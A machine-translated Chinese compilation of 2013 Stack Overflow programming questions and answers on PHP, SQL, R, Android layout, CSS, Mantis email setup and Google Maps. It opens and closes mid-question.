设置该类，以便具有更多 html 模板的另一个方法调用此提要方法。（我并不想在这里过于多余，但我上次问这个问题时再次被否决了）。所以我对 oop 很陌生，我希望显示使用 facebook 登录的人的个人资料图片。这不一定是 facebook 问题，因为我知道如何正常进行，但我不知道如何仅使用他们的 id 在类范围内获取 facebook 信息。通常我会通过链接到这个网址[https://graph.facebook.com/](https://graph.facebook.com/) /picture 来获取他们的照片。当我只在数据库中搜索他们的 facebook id 时，我该如何在课堂上执行此操作？我已经在这个问题上工作了几天，但我自己无法解决。

它已经到了我只想静态输入所有内容的地步，因为我知道我可以很容易地做到这一点，但我真的很想了解正确的方法是什么，特别是因为如果我想编辑这么多这些小盒子改天换东西真的很麻烦。谢谢你的帮助。对此，我真的非常感激。如果有任何不清楚的地方，请告诉我，我会尽快更新 questino。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:00:09.063

> 当我只在数据库中搜索他们的 facebook id 时，如何在课堂上执行此操作

```
echo '<img src="https://graph.facebook.com/' .  $row['facebook_id'] . '/picture" />' ; 
```

你说你只将 facebook id 存储在你的数据库中。这就是显示图片所需的全部内容。只需附加`/picture`到用户的 FB 图表链接即可获取图片。

# php - 将 SQL PHP 数组添加到已经存在的数组中

> ID：15262082
> 
> 赞同：0
> 
> 时间：2013-03-07T02:39:06.373
> 
> 标签：php, sql, json, foreach, while-loop

我有两个数据库表。一个包含市场，另一个包含市场的位置。Marketplaces 可以有多个位置，这两个表通过 MarketplaceID 连接。我需要查询市场将其转换为数组，并在 foreach 或 while 期间，将位置作为数组添加到市场。这都是两个 json 响应的一部分。但是，我的目标是将数据组合在一起并有一个 json 响应，其中位置位于市场 json 数据中作为“位置”。最终是一个数组，其中 Marketplaces 是父级， Locations 是子级。

代码 1（Table1 查询）：

```
$sql = "SELECT * FROM Marketplaces WHERE Status = 1";
$result = mysql_query($sql);

while($row = mysql_fetch_assoc($result)){   
  foreach($row as $key => $value){
      $arr[$key] = $value;
  }
  $main_arr[] = $arr;
}
return $main_arr; 
```

结果：

```
[{"MarketplaceID":"1","AccountID":"0","BusinessName":"Mike's Pub","BusinessType":"1","Status":"1","CreationDate":"0000-00-00 00:00:00"}] 
```

代码2（Table2查询）：

```
$sql = "SELECT * FROM Locations WHERE MarketplaceID = 1";
$results = mysql_query($sql);

while($row = mysql_fetch_assoc($results)){
  foreach($row as $key => $value){
    $arr[$key]=$value;
  }
  $main_arr[] = $arr;
} 
```

结果：

```
[{"LocationID":"1","MarketplaceID":"1","Address1":"5055 Business Center Drive","Address2":"Suite 100","City":"San Francisco","CA":"1","Zip":"90210","Phone1":"(555) 555-555","Phone2":"(555) 555-5555","EmailAddress":"email@msn.com","StoreNumber":"200"},{"LocationID":"2","MarketplaceID":"1","Address1":"112 Street Court","Address2":"","City":"Los Angeles","StateID":"2","Zip":"90210","Phone1":"(555) 555-6666","Phone2":"","EmailAddress":"email@gmail.com","StoreNumber":"300"}] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:01:05.223

首先，放下这个

```
 foreach($row as $key => $value){
      $arr[$key] = $value;
  } 
```

`$arr = $row`除了与;相同之外，它什么也不做 实际上它做了其他事情 - 产生`$arr`未定义的警告。

**编辑**现在更新答案，初始查询已从更改`WHERE MarketplaceID=1`为`WHERE Status = 1"`

```
$main_arr=array();
$sql = "SELECT * FROM Marketplaces WHERE Status = 1";
$result = mysql_query($sql);
while($row = mysql_fetch_assoc($result)){   
  $row['locations']=array();
  $sql2 = "SELECT * FROM Locations WHERE MarketplaceID = ".$row['MarketplaceID'];
  $results2 = mysql_query($sql2);
  while($row2 = mysql_fetch_assoc($results2)){
      $row['locations'][]=$row2;
  }
  $main_arr[] = $row; 
}

// print_r($main_arr); and view page source to read, rather than a JSON string 
```

实际上我会稍微不同地这样做，这样我的数组就不会混淆 Marketplace 内的位置，但仍将它们保持在一起，如下所示

```
while($row = mysql_fetch_assoc($result)){   
  $thisrow=array('marketplace'=>$row, 'locations'=>array());
  $sql2 = "SELECT * FROM Locations WHERE MarketplaceID = ".$row['MarketplaceID'];
  $results2 = mysql_query($sql2);
  while($row2 = mysql_fetch_assoc($results2)){
      $thisrow['locations'][]=$row2;
  }
  $main_arr[] = $thisrow; 
} 
```

所以对象是

```
{ 
    "marketplace": {"MarketplaceID": 1, "BusinessName": "Fred Bloggs", ... }
    "locations": [
        {"LocationId": 1, "Address1": "Some address"},
        {"LocationId": 2, "Address1": "Some address"}
    ]
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:08:39.160

如果我没看错的话，您的第一个数组是一个包含 Marketplace 1 数据的单维数组，而您的第二个数组是一个多维数组，其中父数组中的每个元素都包含一个子数组，其中包含有关单个位置的信息。如果要将第二个数组放在第一个数组中，请尝试像这样嵌套循环：

```
$sql = "SELECT * FROM Marketplaces WHERE MarketplaceID = 1";
$result = mysql_query($sql);

while($row = mysql_fetch_assoc($result)){   

  foreach($row as $key => $value){
  $arr[$key] = $value;

}

$sql2 = "SELECT * FROM Locations WHERE MarketplaceID = 1";
$results2 = mysql_query($sql2);

while($row2 = mysql_fetch_assoc($results2)){

  foreach($row2 as $key => $value){
  $arr2[$key]=$value;

}

$arr['locations'] = $arr2;

$main_arr = $arr;

} 
```

这将创建一个临时数组 $arr2，其中包含您的位置数据，然后将其存储在 $arr['locations'] 中。在代码末尾，您要添加到 $main_arr 的 $arr 应具有以下元素：“MarketplaceID”、“AccountID”、“BusinessName”、“BusinessType”、“Status”、“CreationDate”、“location "，并且 "location" 应该是一个包含元素的数组，这些元素是包含从数据库中提取的位置信息的数组。

希望这能回答你的问题。

# sql-server - 如何在 SQL Server 中为字符串列创建非聚集索引？

> ID：15262083
> 
> 赞同：0
> 
> 时间：2013-03-07T02:39:10.540
> 
> 标签：sql-server, database-indexes

我刚试过这个，得到了有用的信息

表 'Users' 中的列 'Username' 的类型不能用作索引中的键列。

用户名是一个 nvarchar(max) 列。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T02:49:17.313

您不能将索引添加到 nvarchar(max) 或 varchar(max) 列，但它可以是索引的一部分。

您可以将其包含在索引中，但该索引需要离线创建/重建。

从您的列名“用户名”中猜测，我会将列类型更改为较小的类型，例如 nvarchar(50)。nvarchar(max) 数据类型最多可以存储 4Gb 的文本，并用于更多的全文存储（在这种情况下，您将设置全文搜索）。

# r - R - 故意屏蔽包函数中的函数？

> ID：15262084
> 
> 赞同：4
> 
> 时间：2013-03-07T02:39:12.793
> 
> 标签：r

我正在尝试屏蔽包中的函数调用的函数。

作为可重现（我认为）的示例，请查看函数`isTRUE`：

```
function (x) 
identical(TRUE, x) 
```

假设出于某种原因我想`identical`总是*返回*，`"foobar"`因此`isTRUE`总是返回“foobar”：

```
# try override identical
identical <- function(...) { return('foobar') }
identical(TRUE, 'a') # 'foobar', as expected 
```

现在我调用`isTRUE`，希望该`identical`函数中的调用将访问我的*屏蔽*版本，但它没有：

```
isTRUE('a') # hope that this will return 'foobar'
# [1] FALSE 
```

所以一般来说，**我如何临时导致从打包函数中调用的函数返回不同的东西？**

### 语境

我的包中有一个功能：

```
myFunc <- function(...) {
    if (!require(rgdal)) {
        stop("You do not have rgdal installed")
    }
    # ...
} 
```

我想测试一下，如果没有安装 rgdal，函数会抛出错误。但是，我确实安装了 rgdal。我想`myFunc`认为它不是（暂时），所以我正在尝试做：

```
require <- function(...) { return(FALSE) } 
```

在打电话之前`myFunc`希望它会失败。但是，它似乎`myFunc`并没有被这个欺骗，并且仍然调用`base::require`而不是 my `require`。

（是的，这似乎是一件微不足道的事情，因为`myFunc`如果我没有安装 rgdal 肯定会抛出错误，但假设现在情况更复杂，我想以同样的方式进行测试 - 我的问题仍然存在）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:04:29.047

您可以以编程方式创建一个函数

```
foo <- function(...) if(!require('MASS')) stop('foo')

testfun <- function(fun){
  require <- function(...) FALSE
  fff <- function(){}
    formals(fff) <- formals(fun)
    body(fff) <- body(fun)
  fff

}

testfoo <- testfun('foo') 
```

`require`在创建函数时按原样定义`testfun`。

```
foo()
## Loading required package: MASS

detach(package:MASS)

testfoo()
# Error in testfoo() : foo 
```

你可以用 做类似的事情`local`，但我认为它会更混乱

例如

```
testfoo2 <- local({
  require <- function(...) FALSE
  foo <- function(...) if(!require('MASS')) stop('foo')
  })

testfoo2()
## Error in testfoo2() : foo 
```

* * *

（来自 mathcoffee - 基于此答案的后续行动）。

我能够定义一个函数：

```
overrideIn <- function(f, ...) {                                                
    overrides <- list(...)                                                      
    nms <- names(overrides)[names(overrides) != '']                             
    # stub out the functions                                                    
    for (nm in nms) {                                                           
        assign(nm, overrides[[nm]])                                             
    }                                                                           

    # copy over f                                                               
    fff <- function () {}                                                       
    formals(fff) <- formals(f)                                                  
    body(fff) <- body(f)                                                        
    return(fff)                                                                 
} 
```

这样我就可以做到

```
f <- overrideIn(myFunc, require=function (...) FALSE) 
```

现在，当我调用`f`它时，它具有被覆盖的版本`require`，所以我可以这样做（使用奇妙的[testthat](http://cran.r-project.org/web/packages/testthat/index.html)包）：

```
expect_that(f(), throws_error('You do not have rgdal installed')) 
```

* * *

一个稍微简洁的覆盖函数版本（再次是 mnel）

```
overRideIn2 <- function(fun,...){
   e <- environment()
   .list <- list(...)
   ns <- nchar(names(.list))>0L

   list2env(.list[ns], envir = e) 

   fff <- as.function(as.list(fun))

  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-07-18T15:11:30.610

*我正在尝试mnel*和*math.coffee*上面解释的相同`overrideIn`技巧，我最终从[这里](https://www.r-bloggers.com/emulating-dynamic-scoping-in-gnu-r/)找到了另一种选择：

 **```
overRideIn3 <- function(fun,...){
    e <- environment()
    overrides <- list(...)
    ns <- nchar(names(overrides)) > 0L

    list2env(overrides[ns], envir = e) 

    environment(fun) <- e
    fun
} 
```

请注意，所有这些动态作用域技巧仅适用于`fun`. 这意味着任何`fun`调用的辅助函数都无法访问提供的定义，`overrides`除非`fun`也用`overRideIn`.**

# image - 与数据库的图像比较

> ID：15262086
> 
> 赞同：1
> 
> 时间：2013-03-07T02:39:23.030
> 
> 标签：image, matlab, opencv, image-recognition

我想知道我正在尝试做的事情是否可能，或者我是否只是在尝试做不可能/解决无法解决的问题。

我的目标是将图像（它们会有噪音，尽管它们都有非常相似的噪音）与图像数据库进行比较，并告诉我它是否找到匹配项。例如：[img1](http://prntscr.com/vbfot) [img2](http://prntscr.com/vbfq6)

我想指出我已经搜索过了，但是除了理论讨论之外，我从来没有找到实际的应用程序，而且到目前为止我还无法理解如何应用这些想法（在这种情况下，直方图比较完全失败，我不能' t 实现数据树，phash 也失败）。

我怎么能说他们都是相似的？有没有我可以实现的算法来告诉我？

我想我应该首先使用某种降​​噪/边缘检测（实际上我已经尝试了一些并且在边缘检测方面取得了成功）。那么，假设我有一个不错的边缘检测，我该如何比较它们呢？

我知道这不是一个容易的话题，但我想知道我是否正在打一场失败的战斗，应该接受并放弃。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-28T17:56:15.913

这是计算机视觉和模式识别领域长期存在的研究挑战，正如@AndrewMao 所说，有许多博士论文和学术出版物致力于这个主题。一个基本问题是您想要什么样的输出：（1）来自数据库的单个“匹配”图像，或（2）具有降低匹配置信度的数据库图像的排名列表。(1) 通常称为“图像近似重复检测”，(2) 更广泛地称为“基于内容的图像检索”。

今天，解决这两个问题的流行方法是（A）在检测到的特征点（例如由 MSER 识别的斑点区域）提取低级描述符，例如最显着的 SIFT，（B）应用一些几何验证，例如 RANSAC ，（C）测量来自图像对的剩余描述符之间的距离，例如通过欧几里德距离，（D）阈值以保持匹配的描述符，以及（E）计算从查询图像到数据库中每个图像的匹配数。

可视化，图像如下： [http ://www.vlfeat.org/demo/sift_match_1.jpg.pagespeed.ce.Ch9_KgDq8u.jpg](http://www.vlfeat.org/demo/sift_match_1.jpg.pagespeed.ce.Ch9_KgDq8u.jpg)

匹配将产生（绿色的 SIFT 点和蓝色的匹配）： [http ://www.vlfeat.org/demo/sift_match_2.jpg.pagespeed.ce.JvQxRCluzm.jpg](http://www.vlfeat.org/demo/sift_match_2.jpg.pagespeed.ce.JvQxRCluzm.jpg)

# sql - 将 linq with All 转换为 SQL

> ID：15262087
> 
> 赞同：3
> 
> 时间：2013-03-07T02:39:42.330
> 
> 标签：sql, linq, tsql

我有表 A、B 和 C

B 与 A 多对一相关

我想找到所有A，其中C是B的完整子集。

以下 LINQ 查询（伪代码）代表我想要得到的。

```
class A
{
    public B[] Bs { get; set; }
}

class B
{
    public string Text { get; set; }
}

class C
{
    public string Text { get; set; }
}

private static IEnumerable<A> Search(C[] C, A[] A)
{
    return from a in A
            where C.All(c => a.Bs.Any(b => SomeCondition(b, c)))
            select a;
}

private static bool SomeCondition(B b, C c)
{
    //There we comparing B and C
    throw new NotImplementedException();
} 
```

我有以下表结构

```
A ( a_ID INT PRIMARY KEY )
B ( b_ID INT PRIMARY KEY, a_ID INT, Text NVARCHAR(MAX) )
C ( c_ID INT PRIMARY KEY, Text NVARCHAR(MAX) ) 
```

我需要得到 ALL A，其中 B 匹配所有 C。

例子

```
A | a_ID |
  | 1    |
  | 2    |
  | 3    |

B | b_ID | a_ID | Text  |
  | 1    | 1    | Cat   |
  | 2    | 1    | Dog   |
  | 3    | 1    | Rabbit| 
  | 4    | 2    | Cat   | 
  | 5    | 2    | Cat   | -- B can contain duplicates
  | 6    | 2    | Rabbit|

C | c_ID | Text |
  | 1    | Cat  |
  | 2    | Dog  | 
```

输出

```
| a_ID |
| 1    | 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:00:25.983

**UPDATED3：**计算不同的 c_id

```
SELECT b.a_id
  FROM b
  JOIN c ON b.Text = c.Text
GROUP BY b.a_id
HAVING COUNT(distinct c.c_id) = (SELECT COUNT(*) FROM C) 
```

输出：

```
| A_ID |
--------
|    1 | 
```

这是一个**[sqlfiddle 示例](http://sqlfiddle.com/#!3/886b6/26)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T21:33:22.613

好的，我想出了如何制作它。

假设`x=>x.All(e => predicate(e))`可以转换为`x=>!x.Any(e => !predicate(e))`

我们可以将原始表达式转换为以下表达式

```
from a in A
where !C.Any(c => !a.Bs.Any(b => SomeCondition(b, c)))
select a; 
```

任何都可以使用`exists`关键字转换为 SQL

我会假设这`SomeCondition`是平等的

先转换`!a.Bs.Any(b => SomeCondition(b, c))`成SQL

```
NOT EXISTS (
    SELECT 1 FROM B b
        WHERE a.a_id = b.a_id -- a will be added later
          AND c.Text = b.Text -- c will be added later
) 
```

下一个转换`!C.Any(c => !a.Bs.Any(b => SomeCondition(b, c)))`

```
NOT EXISTS (
    SELECT 1 FROM C c
    WHERE NOT EXISTS (
        SELECT 1 FROM B b
        WHERE a.a_id = b.a_id -- a will be added later
          AND c.Text = b.Text
    )
) 
```

最后是整个表情

```
SELECT * FROM A a
WHERE NOT EXISTS (
    SELECT 1 FROM C c
    WHERE NOT EXISTS (
        SELECT 1 FROM B b
        WHERE a.a_id = b.a_id
          AND c.Text = b.Text
    )
) 
```

现在我们可以做一些优化

# android - 在其父视图中使我的视图中心位于底部？

> ID：15262088
> 
> 赞同：0
> 
> 时间：2013-03-07T02:39:45.997
> 
> 标签：android, layout, view

我怎样才能使我的视图（像`ImageView`其他视图一样`View`）在其父视图中居中？如下图所示。

父布局可以使用任何布局，`LinearLayout`, `FrameLayout`。

我知道它具有 center 和 bottom 属性，但我在or`MapView`中找不到该属性。`LinearLayout``FrameLayout`

非常感谢 。

我的英文不好，请原谅我的语法错误。。

```

_____________________
| |
| |
| ___ |
| |___| |
| | | ______ 中央
| |
| |
| |
| |
---------------------
          |
          |
          |
          |

        中央

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T02:47:17.303

解决方案实际上取决于父级的布局。如果是RelativeLayout，您可以使用：

```
<Button 
    android:layout_centerHorizontal="true" 
    android:layout_alignParentBottom="true" /> 
```

如果是 FrameLayout 或 LinearLayout：

```
<Button 
    android:layout_gravity="center_horizontal|bottom" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-03T12:19:17.980

其实你错了。在问题中，他想将图像放在父级的底部。他希望将图像准确地放在中心，但他也希望内部图像的底部垂直居中。

解决方案应该是这样的。您应该知道图像的高度，例如 80dp。并放置一半高度的底部边距，在这种情况下为 40dp。

```
<Button 
    android:layout_height="80dp"
    android:layout_centerInParent="true" 
    android:layout_marginBottom="40dp" /> 
```

如果是 FrameLayout 或 LinearLayout：

```
<Button 
    android:layout_height="80dp"
    android:layout_gravity="center"
    android:layout_marginBottom="40dp" /> 
```

# xampp - Mantis XAMPP 电子邮件配置

> ID：15262089
> 
> 赞同：1
> 
> 时间：2013-03-07T02:40:09.850
> 
> 标签：xampp, mantis

我在 XAMPP 中部署了 matisbt 1.2.12。我无法配置电子邮件（Microsoft Exachnage 服务器）。我的 config_inc 看起来像这样：

```
 <?php
         $g_hostname = 'localhost';
         $g_db_type = 'mysql';
         $g_database_name = 'bugtracker';
         $g_db_username = 'root';
         $g_db_password = 'XXXXXX';
         #Branding Mantis
         #Display
         $g_window_title = 'XXXXX';
         $g_favicon_image='images/XXXX';
         $g_logo_url = 'http://XXXX';
         $g_logo_image = 'images/XXXXX'; 
         #SMTP Config
         $g_log_level = LOG_EMAIL | LOG_EMAIL_RECIPIENT;
         $g_log_destination = 'file:D:/Bug_tracker/xampp/apache/logs/mantisbt.log';
         $g_allow_signup    = ON;  //allows the users to sign up for a new account
         $g_enable_email_notification = ON; //enables the email messages
         $g_phpMailer_method = PHPMAILER_METHOD_SMTP;
         $g_smtp_host = 'XXXXX';
         $g_smtp_connection_mode = 'tls';
         $g_smtp_port = '25';
         $g_smtp_username = 'XXXXXXX';
         $g_smtp_password = 'XXXXXX';
         $g_from_email = 'XX@XXXX';
         $g_administrator_email = 'XXXXXXXX'; 
         $g_from_name         = 'XXX Bug Tracker';
     ?> 
```

主机是交换服务器的 IP 地址。$g_log_destination 的日志文件给出

```
电子邮件的密码重置 = 此处的用户电子邮件 ID
2013-03-07 13:31 EST 邮件处理 27 条排队消息
2013-03-07 13:31 EST 邮件发送消息 #52 在 2013-03-07 13:31 EST 排队
2013-03-07 13:31 EST 邮件发送消息 #51 在 2013-03-07 13:20 EST 排队
2013-03-07 13:31 EST 邮件发送消息 #50 在 2013-03-07 13:13 EST 排队
2013-03-07 13:31 EST 邮件发送消息 #49 在 2013-03-07 13:04 EST 排队
2013-03-07 13:31 EST 邮件发送消息 #48 在 2013-03-07 12:53 EST 排队

```

我也试过 $g_smtp_connection_mode = 'ssl' 。当我将 PHPMAILER_METHOD_SMTP 放在单引号内时。电子邮件内容在文件夹 xampp\tmp\mailoutput 中生成

我已经从[http://www.mantisbt.org/forums/viewtopic.php?f=3&t=15398](http://www.mantisbt.org/forums/viewtopic.php?f=3&t=15398)下载了 testmail.php 。它工作正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-29T11:52:49.927

尝试配置以下一组行以放入您的 config_inc.php

```
# --- Database Configuration ---
$g_hostname      = 'hostname.com';
$g_db_username   = 'username';
$g_db_password   = 'password';
$g_database_name = 'dbname';
$g_db_type       = 'mysql';

# --- Anonymous Access / Signup ---
$g_allow_signup             = ON;
$g_allow_anonymous_login    = OFF;
$g_anonymous_account        = '';

# --- Email Configuration ---
$g_phpMailer_method     = PHPMAILER_METHOD_MAIL; # or PHPMAILER_METHOD_SMTP, PHPMAILER_METHOD_SENDMAIL
$g_smtp_host            = 'hostname.com';# used with PHPMAILER_METHOD_SMTP
$g_smtp_username        = '';                   # used with PHPMAILER_METHOD_SMTP
$g_smtp_password        = '';                   # used with PHPMAILER_METHOD_SMTP
$g_administrator_email  = 'anymailid@gmail.com';
$g_webmaster_email      = 'webmaster@gmail.com';
$g_from_name            = 'Gecko Bug Tracker';
$g_from_email           = 'anymailid@gmail.com';    # the "From: " field in emails
$g_return_path_email    = 'anymailid@gmail.com';    # the return address for bounced mail
$g_email_receive_own    = OFF;
$g_email_send_using_cronjob = OFF;

# --- Attachments / File Uploads ---
$g_allow_file_upload    = ON;
$g_file_upload_method   = DATABASE; # or DISK
$g_absolute_path_default_upload_folder = ''; # used with DISK, must contain trailing \ or /.
$g_max_file_size        = 5000000;  # in bytes
$g_preview_attachments_inline_max_size = 256 * 1024;
$g_allowed_files        = '';       # extensions comma separated, e.g. 'php,html,java,exe,pl'
$g_disallowed_files     = '';       # extensions comma separated

# --- Branding ---
$g_window_title         = 'Gecko';
$g_logo_image           = 'images/mantis_logo.gif';
$g_favicon_image        = 'images/favicon.ico';

# --- Real names ---
$g_show_realname = OFF;
$g_show_user_realname_threshold = NOBODY;   # Set to access level (e.g. VIEWER, REPORTER, DEVELOPER, MANAGER, etc)

# --- Others ---
$g_default_home_page = 'my_view_page.php';  # Set to name of page to go to after login

$g_enable_profiles = OFF;
$g_allow_no_category = ON;

$g_set_bug_sticky_threshold = NOBODY;
$g_move_bug_threshold = NOBODY;
$g_set_bug_sticky_threshold = NOBODY;` 
```

# android - Android AVD 没有连接到我们的服务器

> ID：15262091
> 
> 赞同：0
> 
> 时间：2013-03-07T02:40:13.840
> 
> 标签：android, eclipse, connection, ddms

所以我是一个小项目的团队成员，我们使用的是 Git 存储库，所以有相同的代码。该应用程序运行良好，我想我可能已经做了一些 Eclipse 但我不确定。

问题是*我*的应用程序版本不再连接到我们的服务器（主要用于登录）。

*   当我使用我的实际手机时，它工作正常。
*   它适用于我的朋友在他的机器上通过 eclipse 或他的手机使用模拟器。
*   我们的代码绝对是相同的
*   我已尝试根据[此](https://stackoverflow.com/questions/2437366/android-emulator-internet-access)答案更改默认模拟器选项
*   我最近通过 SDK 管理器更新了开发者工具，这个时候它可能已经坏了，但我不这么认为。
*   它实际上似乎是在我从 Git 中提取代码的新版本之后发生的，所以我责怪我的朋友 :D，但如果它在我的手机上运行，​​并且在他的模拟器和手机上运行良好，那么我确信没有问题实际代码。
*   我还检查了 DDMS 中的 Emulator Control 选项卡，这将数据设置为 home 并且没有延迟（默认值）

关于我可以尝试什么的任何想法？

编辑：也尝试[了这个](https://stackoverflow.com/questions/2039964/how-to-connect-android-emulator-to-the-internet)建议，我禁用了任何以太网 LAN 适配器，只是直接无线连接到路由器

# excel - Windows 8 上的 MS Jet 数据库

> ID：15262092
> 
> 赞同：1
> 
> 时间：2013-03-07T02:40:14.537
> 
> 标签：excel, vba, windows-8, excel-2013

我有一个 Excel 宏，它适用于我的 Windows 7 计算机，但不适用于我的 Window 8。在 Windows 8 计算机上，我尝试使用 Excel 2013 和 Excel 2010，它给出了相同的错误。运行时错误 3706。

这是我的连接打开字符串。

```
Myconnection.Open "Provider=Microsoft.Jet.OLEDB.4.0;" & _
    "Data Source=" & Myworkbook & ";" & _
    "Extended Properties=Excel 8.0;" & _
    "Persist Security Info=False" 
```

是否有其他版本可在 Windows 8 上使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-27T14:12:34.153

我刚刚在 Windows XP 机器上为 Excel 2003 构建的 Excel“程序”上遇到了同样的问题。它不会连接到 Windows 8.1 (x64) 机器上的 Access 数据库，说明它缺少该 OLEDB 驱动程序。

对我来说，一个有点脏的切换到另一个驱动程序修复了它。使用我的旧参数，我可以切换到

```
Microsoft.ACE.OLEDB.12.0 
```

这同样有效，似乎很容易解决。（因此，只需将旧的“Jet.OLEDB.4.0”替换为“ACE.OLEDB.12.0”就可以了）。

# css - 用css设置字符宽度

> ID：15262094
> 
> 赞同：16
> 
> 时间：2013-03-07T02:40:25.770
> 
> 标签：css, webfonts, graphical-logo

我需要用 css 设计一个简单的标志，除了字母大小，一切都很好。要求是使用 verdana 字体，但要使用宽字符，如图所示。但是，使用当前代码，它们看起来很窄。无论如何在不使用图像的情况下实现这种行为？

我不是在寻找字母间距，而是如何让字符本身占据一定数量的像素。例如，我希望 letter`t`的字体大小（高度）为 30 像素，并且是标准宽度的两倍。

宽幅图像： ![宽字符](../Images/d2f4fba981327d6defda9b49ebe6b143.png)

带有代码的标准徽标：![标准](../Images/9e72c108384897f6d5c08c98319fddae.png)

这是徽标的当前格式：

```
.brand {
    color: white;
    display: block;
    float: left;
    font-size: 40px;
    font-weight: 200;
    margin-top: 5px;
    margin-bottom: 5px;
    padding: 27px 20px 13px 20px;

    letter-spacing:2px;
    text-transform: full-width;

    background: #083D68;

    -moz-border-radius-topleft: 10px;
    -webkit-border-top-left-radius: 10px;
     border-top-left-radius: 10px;
    -moz-border-radius-bottomright: 10px;
    -webkit-border-bottom-right-radius: 10px;
    border-bottom-right-radius: 10px;

    -moz-box-shadow: inset 4px -4px 13px 0 #333;
    -webkit-box-shadow: inset 4px -4px 13px 0 #333;
    box-shadow: inset 4px -4px 13px 0 #333;

} 
```

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-03-07T02:55:51.193

您正在寻找的是`transform:scale(x, y)`. 例如：

```
-webkit-transform:scale(2.0, 1.0);
-moz-transform:scale(2.0, 1.0);
-ms-transform:scale(2.0, 1.0);
-o-transform:scale(2.0, 1.0);
transform:scale(2.0,1.0); 
```

您必须为所有浏览器指定它，至少现在是这样。

## 编辑：

我忘了链接[我的 jsfiddle](http://jsfiddle.net/amullins/DgzMV/1/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-07-23T09:42:20.177

您的代码示例看起来不像 Verdana 重量 700。

选择正确的

字体系列：'Verdana'；字体粗细：700；

至少在安装了 Verdana 的系统上会给出正确的结果。

# android - 谷歌地图不断将自己定位到洛斯阿特洛斯

> ID：15262098
> 
> 赞同：-1
> 
> 时间：2013-03-07T02:41:03.960
> 
> 标签：android, cordova, google-maps-api-3, sencha-touch, sencha-touch-2

嗨，我一直试图在我当前的位置放置一个标记，但下面的代码一直返回到 Los Atlos，如果我取出标记它将找到我的位置，我如何让标记工作？

```
Ext.define('FirstApp.view.Mapd',{
extend:'Ext.Panel',
    xtype:'maps',

     config : {
        fullscreen: true,
        layout: 'fit',
       title:'Map',
        iconCls:'map',

        items: [{
            xtype:  'map',

            mapOptions : {
               useCurrentLocation: true,
                zoom : 12,
                mapTypeId : google.maps.MapTypeId.ROADMAP,
                navigationControl: true,
                navigationControlOptions: {
                    style: google.maps.NavigationControlStyle.DEFAULT
                }
            },

            listeners: {

                maprender: function(comp, map) {
                   var marker = new google.maps.Marker({
                   map : map,
                   position : map.center,
                   title : "Me",
                   animation: google.maps.Animation.BOUNCE
                       });

                    setTimeout(function() {
                          map.panTo(map.center);
                    }, 1000);
                }
            }
        }]
    }
}) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T20:31:12.397

您的指令顺序完全错误……您需要按照以下顺序进行操作::

1.  通过调用 geo 方法找到您当前的位置并将您的 currentLocation 更新到该位置，如下所示：

    ```
    mapOptions : { . . . 
          center : center
          zoom : 15
    },

    geo:new Ext.util.GeoLocation({

            autoUpdate:true,
            maximumAge: 0,
            timeout:2000,
            listeners:{
                locationupdate: function(geo) {
                    center = new google.maps.LatLng(geo.latitude, geo.longitude);
                    if (map.rendered)
                        map.update(center)
                    else
                        map.on('activate', map.onUpdate, map, {single: true, data: center});
                },
                locationerror: function (geo,bTimeout, bPermissionDenied, bLocationUnavailable, message) {
                    if(bLocationUnavailable){
                        alert('yayyyyour Current Location is Unavailable on this device');
                    }
                    else if (bPermissionDenied){
                        alert('Location capabilities have been disabled on this device.');
                    }      
                }
            }
        }); 
    ```

2.  将 maprender 事件添加到地图对象的侦听器中，您可以在此处添加地图标记。
    完成上述步骤后，您的地图最终将完美地以您的 currentLocation 为中心（不会出现任何错误情况），然后您创建标记对象，并将其位置设置为地图对象的中心（因为我们已经将反对我们当前的位置，这意味着标记现在在我们当前的位置）

    ```
    maprender : function(comp, map){
                var pos1;
                pos1 = new google.maps.LatLng(lats, longs);
                pos = pos1;
                var marker = new google.maps.Marker({
                     . . . .
                });
                map.setMapTypeId(google.maps.MapTypeId.HYBRID);

                setTimeout( function(){map.panTo (pos);} , 1000);
            } 
    ```

# php - Apache mod_deflate 和分块传输

> ID：15262099
> 
> 赞同：0
> 
> 时间：2013-03-07T02:41:06.897
> 
> 标签：php, apache, chunked-encoding, mod-deflate

我的网站在 Apache 2.2.24 + PHP 5.3.22 上运行。Apache 与 mod_deflate 一起安装，我的 .htaccess 如下所示：

```
<ifmodule mod_deflate.c>
AddOutputFilterByType DEFLATE text/text text/html text/plain text/xml text/css application/x-javascript application/javascript text/javascript
</ifmodule> 
```

它有效，文件在发送之前被压缩。我想知道是否有任何方法可以使用分块传输，最好将html页面的头部发送到浏览器。

```
<html>
<head>
...
</head>
<?php
 ob_flush();
 flush();
 sleep(10);
?>
<body>
...
</body>
</html> 
```

不幸的是，当 DEFLATE 打开时，这不起作用：头部在 10 秒后加载，即当接收到整页时。另一方面，当我尝试从 .htaccess 文件中删除选项以关闭 DEFLATE 时，会在调用 sleep() 函数之前发送头部。

使用最新的 Apache 和 PHP 版本，有没有办法让 mod_deflate 和分块传输一起工作？根据[http://www.phpied.com/progressive-rendering-via-multiple-flushes/](http://www.phpied.com/progressive-rendering-via-multiple-flushes/)应该是，但作为一篇旧文章，我想在浪费时间之前听听您的想法。

# javascript - 在 Ajax 中引用父 Div 成功

> ID：15262109
> 
> 赞同：0
> 
> 时间：2013-03-07T02:42:22.417
> 
> 标签：javascript, jquery, ajax, jquery-animate

我想在单击链接并成功进行 ajax 调用时隐藏父 div。如果我将 hide() 放在 ajax 的成功部分中，它将不起作用：

```
$('.mylink').click(function(){

     $.ajax({
          type: "POST",
          data: dataString,
          url: "includes/edit-packages.php",
